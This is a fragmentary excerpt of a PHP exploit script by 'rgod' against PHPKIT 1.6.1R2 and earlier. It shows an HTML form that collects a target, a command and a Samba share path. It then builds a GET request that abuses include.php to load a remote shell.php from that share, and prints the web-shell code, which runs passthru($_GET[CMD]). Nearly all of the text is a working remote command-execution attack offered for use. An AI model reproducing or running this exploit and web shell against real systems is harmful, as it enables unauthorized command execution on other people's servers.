...
#                                                                              
#
#  Sun-Tzu: "All men can see the tactics whereby I conquer, but what none 
can  #
...
echo'<html><head><title>* PHPKIT <= 1.6.1R2 remote commands execution 
exploit **
...
class="Stile6">
* PHPKIT <= 1.6.1R2 remote commands execution exploit ** </p><p 
class="Stile6">a
script  by  rgod  at    <a 
...
path (ex:
/phpkit/ or just / ) </span></p><p><input type="text" name="cmd">          
<span
class="Stile5"> * specify a command   </span>   </p>   <p>   <input  
type="text"
name="smb_location"><span class="Stile5">* specify a Samba resource(ex: 
\\\\192.
168.1.2\\c\\path_to\\shell.php </span></p> <p> <input   type="text" 
name="port">
<span class="Stile5">specify  a  port other than  80 (default 
value)</span> </p>
...
check the path!'; die;}
  ...
  $packet="GET ".$p."include.php?CMD=$cmd&path=".$smb_location."/ 
HTTP/1.1\r\n";
  $packet.="Host: ".$host."\r\n";
...
{echo "Note: on \\\\someip\\path_to\\shell.php you need this 
code:<br><br>";
 echo  nl2br(htmlentities("
        <?php
        ob_clean();echo\"Hi 
Master!\";ini_set(\"max_execution_time\",0);passthru(\$_GET[CMD]);die;
        ?>
        "))."<br>";
